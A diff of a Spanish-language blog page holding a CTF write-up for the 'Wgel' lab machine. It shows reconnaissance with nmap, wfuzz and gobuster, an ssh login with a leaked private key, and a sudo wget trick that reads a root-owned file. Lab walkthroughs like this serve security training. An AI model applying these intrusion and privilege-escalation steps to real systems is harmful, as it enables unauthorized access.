@@ -5,7 +5,7 @@
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.176.77
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows.'>
+1 2 3 4 5 6 7 ❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.'>
 <title>Resolución Wgel</title>
 
 <link rel='canonical' href='https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/'>
@@ -15,7 +15,7 @@ Reconocimiento Para empezar lo primero es comprobar si la máquina está activa 
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.176.77
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows.'>
+1 2 3 4 5 6 7 ❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.'>
 <meta property='og:url' content='https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/'>
 <meta property='og:site_name' content='d3b0o'>
 <meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='CTF' /><meta property='article:tag' content='Fácil' /><meta property='article:tag' content='Linux' /><meta property='article:tag' content='wget' /><meta property='article:published_time' content='2022-12-28T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-28T00:00:00&#43;00:00'/><meta property='og:image' content='https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/images/2.png' />
@@ -24,7 +24,7 @@ Reconocimiento Para empezar lo primero es comprobar si la máquina está activa 
 IP Atacante = 10.10.10.10
 IP víctima = 10.10.176.77
 Reconocimiento Para empezar lo primero es comprobar si la máquina está activa y que OS tiene
-❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms En este caso da un ttl (time to live) de 63, entendiendo que ttl=64: Linux / ttl=128: Windows."><meta name="twitter:card" content="summary_large_image">
+1 2 3 4 5 6 7 ❯ ping -c 1 10.10.176.77 PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data. 64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms --- 10.10.176.77 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 108."><meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:image" content='https://d3b0o.github.io/p/resoluci%C3%B3n-wgel/images/2.png' />
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-WKTZJ16NWQ"></script>
 <script>
@@ -354,6 +354,20 @@ if (!doNotTrack) {
         
 
         
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    4 minutos a leer
+                </time>
+            </div>
+        
     </footer>
     
 
@@ -371,20 +385,38 @@ if (!doNotTrack) {
 <p>IP víctima = 10.10.176.77</p>
 <h2 id="reconocimiento">Reconocimiento</h2>
 <p>Para empezar lo primero es comprobar si la máquina está activa y que OS tiene</p>
-<pre><code class="language-bash">❯ ping -c 1 10.10.176.77
-PING 10.10.176.77 (10.10.176.77) 56(84) bytes of data.
-64 bytes from 10.10.176.77: icmp_seq=1 ttl=63 time=108 ms
-
---- 10.10.176.77 ping statistics ---
-1 packets transmitted, 1 received, 0% packet loss, time 0ms
-rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms
-</code></pre>
-<p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ping -c <span class="m">1</span> 10.10.176.77
+</span></span><span class="line"><span class="cl">PING 10.10.176.77 <span class="o">(</span>10.10.176.77<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+</span></span><span class="line"><span class="cl"><span class="m">64</span> bytes from 10.10.176.77: <span class="nv">icmp_seq</span><span class="o">=</span><span class="m">1</span> <span class="nv">ttl</span><span class="o">=</span><span class="m">63</span> <span class="nv">time</span><span class="o">=</span><span class="m">108</span> ms
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">--- 10.10.176.77 ping statistics ---
+</span></span><span class="line"><span class="cl"><span class="m">1</span> packets transmitted, <span class="m">1</span> received, 0% packet loss, <span class="nb">time</span> 0ms
+</span></span><span class="line"><span class="cl">rtt min/avg/max/mdev <span class="o">=</span> 108.118/108.118/108.118/0.000 ms
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En este caso da un ttl (time to live) de <strong>63</strong>, entendiendo que <strong>ttl=64: Linux</strong> / <strong>ttl=128: Windows</strong>. Esta máquina es <strong>Linux</strong> por aproximación</p>
 <h3 id="escaneo-de-puertos-nmap">Escaneo de puertos (nmap)</h3>
 <p>Ahora empezamos con un escaneo de puertos</p>
-<pre><code class="language-bash">nmap -p- --open -sS --min-rate 5000 -n -vvv -Pn 10.10.176.77 -oG allPort
-</code></pre>
-<div class="table-wrapper"><table>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -n -vvv -Pn 10.10.176.77 -oG allPort
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="table-wrapper"><table>
 <thead>
 <tr>
 <th>Parámetro</th>
@@ -426,65 +458,143 @@ rtt min/avg/max/mdev = 108.118/108.118/108.118/0.000 ms
 <p><a class="link" href="https://pastebin.com/tYpwpauW"  target="_blank" rel="noopener"
     >Función extractPorts</a> de <a class="link" href="https://s4vitar.github.io"  target="_blank" rel="noopener"
     >@s4vitar</a></p>
-<pre><code class="language-bash">❯ extractPorts allPorts
-───────┬─────────────────────────────────────────────────────────────────────────────────────────
-       │ File: extractPorts.tmp
-───────┼─────────────────────────────────────────────────────────────────────────────────────────
-   1   │ 
-   2   │ [*] Extracting information...
-   3   │ 
-   4   │     [*] IP Address: 10.10.176.77
-   5   │     [*] Open ports: 22,80
-   6   │ 
-   7   │ [*] Ports copied to clipboard
-   8   │ 
-───────┴─────────────────────────────────────────────────────────────────────────────────────────
-</code></pre>
-<p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
-<pre><code class="language-bash">❯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target
-
-PORT   STATE SERVICE VERSION
-22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey: 
-|   2048 94961b66801b7648682d14b59a01aaaa (RSA)
-|   256 18f710cc5f40f6cf92f86916e248f438 (ECDSA)
-|_  256 b90b972e459bf32a4b11c7831033e0ce (ED25519)
-80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
-|_http-title: Apache2 Ubuntu Default Page: It works
-|_http-server-header: Apache/2.4.18 (Ubuntu)
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-</code></pre>
-<h3 id="web">Web</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ extractPorts allPorts
+</span></span><span class="line"><span class="cl">───────┬─────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">       │ File: extractPorts.tmp
+</span></span><span class="line"><span class="cl">───────┼─────────────────────────────────────────────────────────────────────────────────────────
+</span></span><span class="line"><span class="cl">   <span class="m">1</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">2</span>   │ <span class="o">[</span>*<span class="o">]</span> Extracting information...
+</span></span><span class="line"><span class="cl">   <span class="m">3</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">4</span>   │     <span class="o">[</span>*<span class="o">]</span> IP Address: 10.10.176.77
+</span></span><span class="line"><span class="cl">   <span class="m">5</span>   │     <span class="o">[</span>*<span class="o">]</span> Open ports: 22,80
+</span></span><span class="line"><span class="cl">   <span class="m">6</span>   │ 
+</span></span><span class="line"><span class="cl">   <span class="m">7</span>   │ <span class="o">[</span>*<span class="o">]</span> Ports copied to clipboard
+</span></span><span class="line"><span class="cl">   <span class="m">8</span>   │ 
+</span></span><span class="line"><span class="cl">───────┴─────────────────────────────────────────────────────────────────────────────────────────
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ahora con nmap vamos a intentar buscar las versiones de los servicios de los puertos y ejecutar scripts básicos de reconocimientos</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nmap -p22,80 -sC -sV 10.10.176.77 -oN target
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">2048</span> 94961b66801b7648682d14b59a01aaaa <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> 18f710cc5f40f6cf92f86916e248f438 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> b90b972e459bf32a4b11c7831033e0ce <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    Apache httpd 2.4.18 <span class="o">((</span>Ubuntu<span class="o">))</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Apache2 Ubuntu Default Page: It works
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)</span>
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="web">Web</h3>
 <p>En el puerto 80 está corriendo una web, con el <code>whatweb</code> podemos ver un poco de información sobre la web.</p>
-<pre><code class="language-bash">❯ whatweb 10.10.176.77
-http://10.10.176.77 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.176.77], Title[Apache2 Ubuntu Default Page: It works]
-</code></pre>
-<p>Con <code>ctrl + u</code> podemos ver el código de la web en el cual se ve una línea comentada con un mensaje: <code>&lt;!-- Jessie don't forget to udate the webiste --&gt;</code> Con esto podemos intuir que hay un usuario llamado <strong>Jessie</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ whatweb 10.10.176.77
+</span></span><span class="line"><span class="cl">http://10.10.176.77 <span class="o">[</span><span class="m">200</span> OK<span class="o">]</span> Apache<span class="o">[</span>2.4.18<span class="o">]</span>, Country<span class="o">[</span>RESERVED<span class="o">][</span>ZZ<span class="o">]</span>, HTTPServer<span class="o">[</span>Ubuntu Linux<span class="o">][</span>Apache/2.4.18 <span class="o">(</span>Ubuntu<span class="o">)]</span>, IP<span class="o">[</span>10.10.176.77<span class="o">]</span>, Title<span class="o">[</span>Apache2 Ubuntu Default Page: It works<span class="o">]</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Con <code>ctrl + u</code> podemos ver el código de la web en el cual se ve una línea comentada con un mensaje: <code>&lt;!-- Jessie don't forget to udate the webiste --&gt;</code> Con esto podemos intuir que hay un usuario llamado <strong>Jessie</strong></p>
 <h4 id="wfuzz-y-gobuster-subdirectorios">wfuzz y gobuster (subdirectorios)</h4>
 <p>Con wfuzz vamos a buscar subdirectorios mediante un diccionario ubicado en <code>/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</code> con el siguiente comando</p>
-<pre><code class="language-bash">❯ wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ
-</code></pre>
-<p>Nos reporta el subdirectorio <code>/sitemap</code> en el cual hay una web con muchos apartados.
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ wfuzz -c -t <span class="m">200</span> --hc<span class="o">=</span><span class="m">404</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 10.10.176.77/FUZZ
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Nos reporta el subdirectorio <code>/sitemap</code> en el cual hay una web con muchos apartados.
 Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio <code>sitemap</code>, mediante el mismo comando, pero cambiando la ubicación: de <code>10.10.176.77/FUZZ</code> a <code>10.10.176.77/sitemap/FUZZ</code>. No ha encontrado nada, probamos con gobuster y otro diccionario el cual está ubicado en <code>/usr/share/wordlists/dirb/common.txt</code>.</p>
-<pre><code>gobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt
-</code></pre>
-<h2 id="infiltración">Infiltración</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gobuster dir -u http://10.10.176.77/sitemap/ -w /usr/share/wordlists/dirb/common.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="infiltración">Infiltración</h2>
 <p>Ahora nos reporta varios subdirectorios, entre ellos un .ssh, el cual contiene una <em>rsa private key</em></p>
 <p>Para conectarnos por ssh la vamos a guardar en un archivo llamado <code>id_rsa</code>, y nos vamos a conectar con el usuario Jessie que encontramos anteriormente y la llave que encontramos</p>
-<pre><code>chmod 600 id_rsa
-</code></pre>
-<pre><code>ssh -i id_rsa jessie@10.10.176.77
-</code></pre>
-<h2 id="user-flag">User Flag</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">chmod 600 id_rsa
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ssh -i id_rsa jessie@10.10.176.77
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="user-flag">User Flag</h2>
 <p>Podemos ver la flag en /home/jessie/Documents/user_flag.txt.</p>
 <h2 id="root-flag">Root Flag</h2>
 <p>Con un sudo -l podemos ver que podemos ejecutar wget como root sin proporcionar contraseña. En <a class="link" href="https://gtfobins.github.io/gtfobins/wget/#shell"  target="_blank" rel="noopener"
     >https://gtfobins.github.io/gtfobins/wget/#shell</a> Podemos ver que hay una forma de leer archivos aprovechándonos del wget . Intuyendo que la flag está en /root/root_flag.txt, con los siguientes comandos deberíamos de poder leerlo</p>
-<pre><code>LFILE=/root/root_flag.txt
-</code></pre>
-<pre><code>wget -i $LFILE
-</code></pre>
-<p>Ya tenemos la flag!!!</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">LFILE=/root/root_flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">wget -i $LFILE
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Ya tenemos la flag!!!</p>
 
 </section>
 
@@ -518,6 +628,30 @@ Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio <code>site
     <h2 class="section-title">Contenidos relacionados</h2>
     <div class="related-content">
         <div class="flex article-list--tile">
+            
+                
+<article class="has-image">
+    <a href="/p/resoluci%C3%B3n-wonderland/">
+        
+        
+            <div class="article-image">
+                <img src="/p/resoluci%C3%B3n-wonderland/images/portada.544990aae9de59c8a413955875bee210.png" 
+                        width="1914" 
+                        height="874" 
+                        loading="lazy"
+                        alt="Featured image of post Resolución Wonderland"
+                        
+                        data-hash="md5-VEmQquneWcikE5VYdb7iEA==">
+                
+            </div>
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Resolución Wonderland</h2>
+        </div>
+    </a>
+</article>
+
             
                 
 <article class="has-image">
@@ -610,30 +744,6 @@ Con wfuzz otra vez, vamos a buscar subdirectorios sobre el directorio <code>site
 
         <div class="article-details">
             <h2 class="article-title">Resolución Tomghost</h2>
-        </div>
-    </a>
-</article>
-
-            
-                
-<article class="has-image">
-    <a href="/p/resoluci%C3%B3n-gallery/">
-        
-        
-            <div class="article-image">
-                <img src="/p/resoluci%C3%B3n-gallery/images/3.842e0cbcf1200fcbe132473e900380c4.png" 
-                        width="1914" 
-                        height="874" 
-                        loading="lazy"
-                        alt="Featured image of post Resolución Gallery"
-                        
-                        data-hash="md5-hC4MvPEgD8vhMkc&#43;kAOAxA==">
-                
-            </div>
-        
-
-        <div class="article-details">
-            <h2 class="article-title">Resolución Gallery</h2>
         </div>
     </a>
 </article>
